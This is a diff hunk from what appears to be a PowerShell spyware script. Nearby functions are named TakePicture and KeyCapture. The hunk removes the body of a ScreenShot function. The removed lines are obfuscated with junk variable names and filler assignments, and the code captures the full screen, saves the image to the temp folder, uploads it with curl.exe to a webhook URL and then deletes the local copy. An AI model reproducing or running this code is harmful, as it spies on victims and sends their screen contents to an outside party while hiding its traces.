@@ -805,28 +805,7 @@ Function TakePicture {
 }
 
 Function ScreenShot {
-$o="";$p="";$q="";$r="";$s="";$t="";$u="";$v="";$w="";$x="";$y="";$z=""
-$g5ergwe45eg4fgwG4WEFWEFG = "$env:temp\grab.png"
-Add-Type -AssemblyName System.Windows.Forms
-$a="";$b="";$c="";$d="";$e="";$f="";$g="";$h="";$i=""
-Add-type -AssemblyName System.Drawing
-$h76v67g67gYGTYUF6fg76g = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$6hhb656rshe4g4e = $h76v67g67gYGTYUF6fg76g.Width
-$y=${6};$z=${7};$w=${4};$o=$e
-$j7terg4v4wefg = $h76v67g67gYGTYUF6fg76g.Height
-$nmuty67hwecf7y = $h76v67g67gYGTYUF6fg76g.Left
-$k;$q=$g;$k=${a};$s=${i};
-$j7tj6pahtgbasert = $h76v67g67gYGTYUF6fg76g.Top
-$nh6rthrtshs5rj7tol = New-Object System.Drawing.Bitmap $6hhb656rshe4g4e, $j7terg4v4wefg
-$p=$f;$q=$g;$r=${h};$s=$i
-$0jv4w8fgvefggrf4 = [System.Drawing.Graphics]::FromImage($nh6rthrtshs5rj7tol)
-$0jv4w8fgvefggrf4.CopyFromScreen($nmuty67hwecf7y, $j7tj6pahtgbasert, 0, 0, $nh6rthrtshs5rj7tol.Size)
-$f=$p;$g=$q
-$nh6rthrtshs5rj7tol.Save($g5ergwe45eg4fgwG4WEFWEFG, [System.Drawing.Imaging.ImageFormat]::png)
-Start-Sleep 1
-curl.exe -F "file1=@$g5ergwe45eg4fgwG4WEFWEFG" $hookurl
-Start-Sleep 2
-rm -Path $g5ergwe45eg4fgwG4WEFWEFG
+
 }
 
 Function KeyCapture {
